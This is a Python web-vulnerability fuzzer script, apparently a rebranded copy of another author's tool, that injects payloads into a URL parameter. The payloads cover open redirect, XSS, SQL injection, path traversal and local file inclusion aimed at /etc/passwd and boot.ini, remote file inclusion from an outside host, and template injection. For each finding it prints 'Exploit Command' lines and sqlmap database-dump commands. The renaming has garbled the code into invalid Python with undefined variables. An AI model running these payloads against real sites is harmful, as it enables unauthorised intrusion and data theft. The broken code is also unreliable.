#!/usr/bin/python3
# Joker.Hacker Fuzzer v20230331 by @xer0dayz
# https://www.facebook.com/asadullah.shirzad.56ty.com

from __future__ import print_function
from urllib.parse import urlparse
import urllib.request, sys, os, optparse
from socket import timeout

OKBLUE='\033[94m'
OKJoker.Hacker='\033[91m'
OKJoker.Hacker='\033[92m'
OKOJoker.Hacker='\033[93m'
COLOR1='\033[95m'
COLOR2='\033[96m'
COLOR3='\033[90m'
Joker.Hacker='\x1b[0m'
VERBOSE='1'

def logo():
    print(OKOJoker.Hacker + '      ____        _           __ _  __' + Joker.Hacker)
    print(OKOJoker.Hacker + '     /  _/___    (_)__  _____/ /| |/ /' + Joker.Hacker)
    print(OKOJoker.Hacker + '     / // __ \  / / _ \/ ___/ __/   / ' + Joker.Hacker)
    print(OKOJoker.Hacker + '   _/ // / / / / /  __/ /__/ /_/   |  ' + Joker.Hacker)
    print(OKOJoker.Hacker + '  /___/_/ /_/_/ /\___/\___/\__/_/|_|  ' + Joker.Hacker)
    print(OKOJoker.Hacker + '         /_____/                     ' + Joker.Hacker)
    print('')
    print(OKJoker.Hacker +   '--==Joker.Hacker ==-- ' + Joker.Hacker)
    print(OKJoker.Hacker +   '   --== https://www.facebook.com/asadullah.shirzad.56 ==-- ' + Joker.Hacker)
    print('')

if os.path.isfile("/tmp/Joker.Hacker.txt"):
    os.remove("/tmp/Joker.Hacker.txt")

f = open('/tmp/Joker.Hacker.txt', 'w')

def active_scan():

    new_url = base_url

    # Open Joker.Hackerirect 1 ######################################################################################
    try:
        Joker.Hackerirect_exploit = urllib.parse.quote("google.com")

        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(Joker.Hackerirect_exploit) + Joker.Hacker)

        Joker.Hackerirect_url = new_url.replace("Joker.Hacker", Joker.Hackerirect_exploit)
        http_request = urllib.request.urlopen(Joker.Hackerirect_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_status = http_request.getcode()
        http_length_diff = str(http_length_base - http_length)

        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + Joker.Hackerirect_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "<title>Google</title>" in http_response:
            print(OKJoker.Hacker + "[+] Open Joker.Hackerirect Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + Joker.Hackerirect_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s -I '" + Joker.Hackerirect_url + "' | egrep location --color=auto")
            f.write("P3 - MEDIUM, Open Joker.Hackerirect, " + str(Joker.Hackerirect_url) + ", " + str(http_status) + "\n")

    except:
        pass

    # Open Joker.Hackerirect 2 ######################################################################################
    try:
        Joker.Hackerirect_exploit = urllib.parse.quote("//google.com")

        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(Joker.Hackerirect_exploit) + Joker.Hacker)

        Joker.Hackerirect_url = new_url.replace("Joker.Hacker", Joker.Hackerirect_exploit)
        http_request = urllib.request.urlopen(Joker.Hackerirect_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_status = http_request.getcode()
        http_length_diff = str(http_length_base - http_length)

        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + Joker.Hackerirect_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "<title>Google</title>" in http_response:
            print(OKJoker.Hacker + "[+] Open Joker.Hackerirect Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + Joker.Hackerirect_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s -I '" + Joker.Hackerirect_url + "' | egrep location --color=auto")
            f.write("P3 - MEDIUM, Open Joker.Hackerirect, " + str(Joker.Hackerirect_url) + ", " + str(http_status) + "\n")

    except:
        pass

    # Open Joker.Hackerirect 3 ######################################################################################
    try:
        Joker.Hackerirect_exploit = urllib.parse.quote("https://google.com")

        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(Joker.Hackerirect_exploit) + Joker.Hacker)

        Joker.Hackerirect_url = new_url.replace("Joker.Hacker", Joker.Hackerirect_exploit)
        http_request = urllib.request.urlopen(Joker.Hackerirect_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_status = http_request.getcode()
        http_length_diff = str(http_length_base - http_length)

        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + Joker.Hackerirect_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "<title>Google</title>" in http_response:
            print(OKJoker.Hacker + "[+] Open Joker.Hackerirect Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + Joker.Hackerirect_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s -I '" + Joker.Hackerirect_url + "' | egrep location --color=auto")
            f.write("P3 - MEDIUM, Open Joker.Hackerirect, " + str(Joker.Hackerirect_url) + ", " + str(http_status) + "\n")

    except:
        pass

    # XSS ######################################################################################

    try:
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(payload) + Joker.Hacker)

        http_request = urllib.request.urlopen(new_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_status = http_request.getcode()
        http_length_diff = str(http_length_base - http_length)
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + new_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        # CHECK FOR REFLECTED VALUE
        if payload in http_response:
            print(OKJoker.Hacker + "[+] Reflected Value Detected! " + Joker.Hacker)
            f.write("P5 - INFO, Reflected Value Detected, " + str(new_url) + ", Payload: " + str(payload) + "\n")

            # IF REFLECTED, TRY HEURISTIC STRING
            payload_exploit_unencoded = '</Joker.Hacker>(1)'
            payload_exploit = '%22%3E%3C%2FJoker.Hacker%3E%281%29'
            xss_url = new_url.replace("Joker.Hacker", payload_exploit)

            try:
                http_request = urllib.request.urlopen(xss_url)
                http_response = str(http_request.read())
                http_length = len(http_response)
                http_length_diff = str(http_length_base - http_length)
                http_status = http_request.getcode()
                if (verbose == "y"):
                    print(COLOR2 + "[i] New URL: " + xss_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

            except:
                pass

            # CONTINUE TO XSS EXPLOITATION
            if payload_exploit_unencoded in http_response:
                payload_exploit2 = urllib.parse.quote('"><iframe/onload=alert(1)>')
                xss_url2 = new_url.replace("Joker.Hacker", payload_exploit2)

                try:
                    http_request = urllib.request.urlopen(xss_url2)
                    http_response = str(http_request.read())
                    http_length = len(http_response)
                    http_length_diff = str(http_length_base - http_length)
                    http_status = http_request.getcode()

                    if (verbose == "y"):
                        print(COLOR2 + "[i] New URL: " + xss_url2 + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

                    print(OKJoker.Hacker + "[+] XSS Found! ", str(payload_exploit2) + Joker.Hacker)
                    print(OKJoker.Hacker + "[+] Vulnerable URL: " + xss_url2 + Joker.Hacker)
                    print(OKJoker.Hacker + "[c] Exploit Command: firefox '" + xss_url2 + "' & ")
                    os.system("curl -s '" + xss_url2 + "' | egrep alert\(1\) --color=auto")
                    f.write("P3 - MEDIUM, Cross-Site Scripting (XSS), " + str(xss_url2) + ", " + str(payload_exploit2) + "\n")
                    #os.system("firefox '" + xss_url2 + "' > /dev/null 2> /dev/null")
                except:
                    pass

    except:
        pass

    # SQLi ######################################################################################
    try:
        sqli_exploit = '\''
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + Joker.Hacker)

        sqli_url = new_url.replace("Joker.Hacker", sqli_exploit)
        http_request = urllib.request.urlopen(sqli_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + sqli_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "SQL" in http_response or http_status == 500 or http_status == 503:
            print(OKJoker.Hacker + "[+] SQL Injection Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + sqli_url + Joker.Hacker)
            sqlmap_command = 'sqlmap --batch --dbs -u "' + full_url + '"'
            print(OKJoker.Hacker + "[c] Exploit Command: " + sqlmap_command)
            #os.system(sqlmap_command)
            f.write("P2 - HIGH, SQL Injection, " + str(sqli_url) + ", " + str(full_url) + "\n")

    except:
        pass

    # SQLi 2 ######################################################################################
    try:
        sqli_exploit = '\\'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + Joker.Hacker)

        sqli_url = new_url.replace("Joker.Hacker", sqli_exploit)
        http_request = urllib.request.urlopen(sqli_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + sqli_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "SQL" in http_response or http_status == 500 or http_status == 503:
            print(OKJoker.Hacker + "[+] SQL Injection Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + sqli_url + Joker.Hacker)
            sqlmap_command = 'sqlmap --batch --dbs -u "' + full_url + '"'
            print(OKJoker.Hacker + "[c] Exploit Command: " + sqlmap_command)
            #os.system(sqlmap_command)
            f.write("P2 - HIGH, SQL Injection, " + str(sqli_url) + ", " + str(full_url) + "\n")

    except:
        pass

    # Windows Directory Traversal ######################################################################################
    try:
        traversal_exploit = '/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKJoker.Hacker + "[+] Windows Directory Traversal Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Windows Directory Traversal 2 ######################################################################################
    try:
        traversal_exploit = '/..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKJoker.Hacker + "[+] Windows Directory Traversal Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Windows Directory Traversal 3 ######################################################################################
    try:
        traversal_exploit = '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini%00test.htm'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "boot loader" in http_response or "16-bit" in http_response or "16-bit" in http_response:
            print(OKJoker.Hacker + "[+] Windows Directory Traversal Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + Joker.Hacker)
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Windows Directory Traversal 4 ######################################################################################
    try:
        traversal_exploit = '..%2fWEB-INF%2fweb.xml'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "<web-app" in http_response:
            print(OKJoker.Hacker + "[+] Windows Directory Traversal Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto" + Joker.Hacker)
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Linux Directory Traversal ######################################################################################
    try:
        traversal_exploit = '/../../../../../../../../../../../../../../../../../etc/passwd'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "root:" in http_response:
            print(OKJoker.Hacker + "[+] Linux Directory Traversal Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto" + Joker.Hacker)
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # Linux Directory Traversal 2 ######################################################################################
    try:
        traversal_exploit = '/../../../../../../../../../../../../../../../../../etc/passwd%00'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + Joker.Hacker)

        traversal_url = new_url.replace("Joker.Hacker", traversal_exploit)
        http_request = urllib.request.urlopen(traversal_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "root:" in http_response:
            print(OKJoker.Hacker + "[+] Linux Directory Traversal Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + traversal_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto" + Joker.Hacker)
            f.write("P2 - HIGH, Directory Traversal, " + str(traversal_url) + ", " + str(traversal_exploit) + "\n")

    except:
        pass

    # LFI Check ######################################################################################
    try:
        rfi_exploit = '/etc/passwd'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + Joker.Hacker)

        rfi_url = new_url.replace("Joker.Hacker", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "root:" in http_response:
            print(OKJoker.Hacker + "[+] Linux Local File Inclusion Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rfi_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto" + Joker.Hacker)
            f.write("P2 - HIGH, Local File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # LFI Check 2 ######################################################################################
    try:
        rfi_exploit = '/etc/passwd%00'
        if (verbose == "y"):
            print (COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + Joker.Hacker)

        rfi_url = new_url.replace("Joker.Hacker", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "root:" in http_response:
            print(OKJoker.Hacker + "[+] Linux Local File Inclusion Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rfi_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto" + Joker.Hacker)
            f.write("P2 - HIGH, Local File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # LFI Check 3 ######################################################################################
    try:
        rfi_exploit = 'C:\\boot.ini'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + Joker.Hacker)

        rfi_url = new_url.replace("Joker.Hacker", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKJoker.Hacker + "[+] Windows Local File Inclusion Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rfi_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto" + Joker.Hacker)
            f.write("P2 - HIGH, Local File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # LFI Check 4 ######################################################################################
    try:
        rfi_exploit = 'C:\\boot.ini%00'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + Joker.Hacker)

        rfi_url = new_url.replace("Joker.Hacker", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "boot loader" in http_response or "16-bit" in http_response:
            print(OKJoker.Hacker + "[+] Local File Inclusion Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rfi_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto" + Joker.Hacker)
            f.write("P2 - HIGH, Local File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # RFI Check ######################################################################################
    try:
        rfi_exploit = 'hTtP://tests.arachni-scanner.com/rfi.md5.txt'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + Joker.Hacker)

        rfi_url = new_url.replace("Joker.Hacker", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "705cd559b16e6946826207c2199bd890" in http_response:
            print(OKJoker.Hacker + "[+] Remote File Inclusion Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rfi_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto")
            f.write("P2 - HIGH, Remote File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # RFI Check 2 ######################################################################################
    try:
        rfi_exploit = 'hTtP://tests.arachni-scanner.com/rfi.md5.txt%00'
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + Joker.Hacker)

        rfi_url = new_url.replace("Joker.Hacker", rfi_exploit)
        http_request = urllib.request.urlopen(rfi_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "705cd559b16e6946826207c2199bd890" in http_response:
            print(OKJoker.Hacker + "[+] Remote File Inclusion Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + rfi_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto")
            f.write("P2 - HIGH, Remote File Inclusion, " + str(rfi_url) + ", " + str(rfi_exploit) + "\n")

    except:
        pass

    # IDOR Check ######################################################################################
    #idor_list = [1,2,3]
    #idor_length_list = []
    #for idor in idor_list:
    #    try:
    #        idor_exploit = str(idor)
    #        # print COLOR2 + "[i] Trying Payload: " + str(idor) + Joker.Hacker
    #        idor_url = new_url.replace("Joker.Hacker", idor_exploit)
    #        http_request = urllib.request.urlopen(idor_url)
    #        http_response = http_request.read()
    #        http_length = len(http_response)
    #        http_status = http_request.getcode()
    #        idor_length_list.append(http_length)
    #        http_length_diff = str(http_length_base - http_length)
    #        #print(COLOR2 + "[i] New URL: " + idor_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)
    #
    #        if (idor_length_list[0] != idor_length_list[1]) or (idor_length_list[1] != idor_length_list[2]) or (idor_length_list[0] != idor_length_list[2]):
    #            print(OKJoker.Hacker + "[+] Possible IDOR Found! " + Joker.Hacker)
    #            print(OKJoker.Hacker + "[+] Vulnerable URL: " + idor_url + Joker.Hacker)
    #            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + idor_url + "'")
    #        #else:
    #            #print(COLOR1 + "[F] IDOR Failed." + Joker.Hacker)
    #    except:
    #        pass

    # Buffer Overflow Check ######################################################################################
    #try:
    #    overflow_exploit = "Joker.Hacker" * 4000
    #    # print COLOR2 + "[i] Trying Payload: " + "Joker.HackerJoker.HackerJoker.HackerJoker.HackerJoker.HackerJoker.Hacker..." + Joker.Hacker
    #    overflow_url = new_url.replace("Joker.Hacker", overflow_exploit)
    #    http_request = urllib.request.urlopen(overflow_url)
    #    http_response = http_request.read()
    #    http_length = len(http_response)
    #    http_status = http_request.getcode()
    #    print COLOR2 + "[i] New URL: " + new_url + "Joker.HackerJoker.HackerJoker.HackerJoker.HackerJoker.HackerJoker.Hacker..." + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + Joker.Hacker
    #
    #    if http_status != 200 or http_status != 414 or http_status != 413:
    #        print OKJoker.Hacker + "[+] Possible Buffer Overflow Found! " + Joker.Hacker
    #    else:
    #        print COLOR1 + "[F] Buffer Overflow Failed." + Joker.Hacker
    #except:
    #    pass
    #

    # SSTI Check ######################################################################################
    try:
        ssti_exploit = urllib.parse.quote('{{1336%2B1}}')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + Joker.Hacker)
        ssti_url = new_url.replace("Joker.Hacker", ssti_exploit)
        http_request = urllib.request.urlopen(ssti_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "1337" in http_response:
            print(OKJoker.Hacker + "[+] Server Side Template Injection Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + ssti_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + ssti_url + "' | egrep 1337 --color=auto" + Joker.Hacker)
            f.write("P3 - MEDIUM, Server Side Template Injection, " + str(ssti_url) + ", " + str(ssti_exploit) + "\n")

    except:
        pass

    # SSTI Check 2 ######################################################################################
    try:
        ssti_exploit = urllib.parse.quote('1336+1')
        if (verbose == "y"):
            print(COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + Joker.Hacker)

        ssti_url = new_url.replace("Joker.Hacker", ssti_exploit)
        http_request = urllib.request.urlopen(ssti_url)
        http_response = str(http_request.read())
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        if (verbose == "y"):
            print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKJoker.Hacker + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + Joker.Hacker)

        if "1337" in http_response:
            print(OKJoker.Hacker + "[+] Server Side Template Injection Found! " + Joker.Hacker)
            print(OKJoker.Hacker + "[+] Vulnerable URL: " + ssti_url + Joker.Hacker)
            print(OKJoker.Hacker + "[c] Exploit Command: curl -s '" + ssti_url + "' | egrep 1337 --color=auto" + Joker.Hacker)
            f.write("P3 - MEDIUM, Server Side Template Injection, " + str(ssti_url) + ", " + str(ssti_exploit) + "\n")

    except:
        pass

